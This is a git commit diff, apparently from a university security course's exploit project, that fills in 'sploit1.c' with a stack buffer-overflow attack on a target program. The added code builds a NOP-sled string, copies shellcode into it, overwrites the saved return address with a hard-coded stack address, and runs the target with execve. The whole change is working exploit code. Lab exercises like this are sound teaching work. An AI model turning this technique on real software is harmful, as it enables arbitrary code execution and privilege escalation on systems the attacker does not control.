820c35872d7e83ef30d5928addc765e3446dde1e
codeyq <chn_yuqian@hotmail.com>
2018-04-09 19:53:25 -0700

    [proj1] sploit1

--- proj1/sploits/sploit1.c
+++ proj1/sploits/sploit1.c
@@ -9,7 +9,22 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+  // put '\0' at the end
+  char sploitstring[256 + 2 * sizeof(int) + 1];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[sizeof(sploitstring) - 1] = 0;
+
+  // shellcode is a string which ends with '\0'
+  // should not copy '\0' to buffer otherwise
+  // there wont be a buffer overflow
+  memcpy(sploitstring + 100, shellcode, sizeof(shellcode) - 1);
+
+  // address of eip
+  int *ret = (int *) (sploitstring + 256 + sizeof(int));
+  *ret = 0xbffffc5c;
+
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
